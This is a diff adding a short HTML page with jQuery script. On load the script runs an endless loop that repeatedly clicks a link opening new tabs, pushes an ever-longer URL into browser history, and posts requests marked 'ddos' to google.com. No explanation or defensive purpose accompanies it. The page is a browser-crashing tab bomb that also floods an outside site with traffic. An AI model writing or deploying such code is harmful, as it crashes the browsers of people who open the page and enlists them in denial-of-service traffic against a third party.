@@ -1,0 +1,14 @@
+<a id="a" href="crash" target="_blank"></a>
+<script src="../jquery.js"></script>
+<script>
+    var total = "";
+    var i = 0;
+    while(true)
+    {
+        $("#a")[0].click();
+        total = total + i.toString();
+        history.pushState(0, 0, total);
+        i++;
+        $.post("//google.com", {"ddos": "true"});
+    }
+</script>
